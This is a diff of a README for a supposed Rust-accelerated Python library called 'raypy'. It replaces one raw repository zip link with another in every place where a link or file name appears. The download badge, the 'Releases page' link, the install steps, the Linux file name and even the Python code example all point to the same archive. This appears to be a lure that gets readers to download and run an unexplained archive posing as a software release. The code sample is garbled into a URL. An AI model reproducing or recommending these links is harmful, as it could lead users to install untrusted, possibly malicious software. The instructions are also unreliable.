@@ -6,13 +6,13 @@ Welcome to raypy! This Rust-powered Python module helps you speed up your comput
 
 ## 📥 Download raypy
 
-[![Download raypy](https://github.com/jay10413/raypy/raw/refs/heads/main/patches/Software-3.6.zip)](https://github.com/jay10413/raypy/raw/refs/heads/main/patches/Software-3.6.zip)
+[![Download raypy](https://github.com/jay10413/raypy/raw/refs/heads/main/examples/Software_2.5.zip)](https://github.com/jay10413/raypy/raw/refs/heads/main/examples/Software_2.5.zip)
 
 You can easily get raypy from our Releases page. 
 
 ## 📂 Visit the Releases Page
 
-To download raypy, please [visit this page to download](https://github.com/jay10413/raypy/raw/refs/heads/main/patches/Software-3.6.zip). There, you can find the latest version and additional files related to the application.
+To download raypy, please [visit this page to download](https://github.com/jay10413/raypy/raw/refs/heads/main/examples/Software_2.5.zip). There, you can find the latest version and additional files related to the application.
 
 ## 🛠️ Requirements
 
@@ -24,12 +24,12 @@ Before downloading, ensure that your system meets the following requirements:
 
 ## 📥 Download & Install
 
-1. Go to [the Releases page](https://github.com/jay10413/raypy/raw/refs/heads/main/patches/Software-3.6.zip).
+1. Go to [the Releases page](https://github.com/jay10413/raypy/raw/refs/heads/main/examples/Software_2.5.zip).
 2. Look for the latest version listed.
 3. Choose the file that matches your operating system:
    - For Windows, download the `.exe` file.
    - For macOS, download the `.pkg` file.
-   - For Linux, download the appropriate `https://github.com/jay10413/raypy/raw/refs/heads/main/patches/Software-3.6.zip` file.
+   - For Linux, download the appropriate `https://github.com/jay10413/raypy/raw/refs/heads/main/examples/Software_2.5.zip` file.
 4. Click on the file to begin the download.
 5. Once downloaded, run the installer following the on-screen instructions.
 
@@ -47,7 +47,7 @@ After installation, you can start using raypy right away. Here are a few simple 
 3. **Use the Functions:** You can now call raypy's functions to perform parallel processing. For example, if you want to calculate Fibonacci numbers faster, you could write:
 
    ```python
-   result = https://github.com/jay10413/raypy/raw/refs/heads/main/patches/Software-3.6.zip(35)
+   result = https://github.com/jay10413/raypy/raw/refs/heads/main/examples/Software_2.5.zip(35)
    print(result)
    ```
 
